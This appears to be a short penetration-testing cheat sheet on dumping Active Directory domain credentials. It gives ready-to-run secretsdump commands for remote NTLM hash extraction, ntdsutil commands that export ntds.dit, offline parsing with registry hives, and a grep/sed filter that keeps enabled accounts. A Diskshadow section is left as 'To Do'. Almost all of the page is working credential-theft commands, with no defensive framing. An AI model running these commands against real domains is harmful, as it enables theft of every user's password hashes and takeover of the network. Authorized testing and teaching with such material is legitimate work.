# Dump the domain

## Remote Access

### Secretsdump.py

```text
secretsdump -just-dc-ntlm -user-status -o [out_file] [Domain]/[User]@[IP] 
```

## Local Access

### NTDSutil

Windows binary allows for export of ntds.dit

```text
ntdsutil "activate instance ntds" "ifm" "create full c:\windows\temp\" "quit" "quit"
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\Pentest' quit quit"
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\Pentest' q q"
```

This can then be extracted using secretsdump.py and registry hashes

```text
secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit local
```

Alternatively, additional information can be included such as if accounts are active:

```text
secretsdump.py -system ./SYSTEM -ntds ./ntds.dit  -o ntdis-extract -user-status LOCAL
```

Then the output can be filtered to remove both disabled and machine accounts:

```text
grep -i "enabled" <secetsdump.py_output.txt> | grep -v "\\$" | sed -e 's! (status=Enabled)!!' $1 > output-filtered.txt
```

### Diskshadow

To Do 

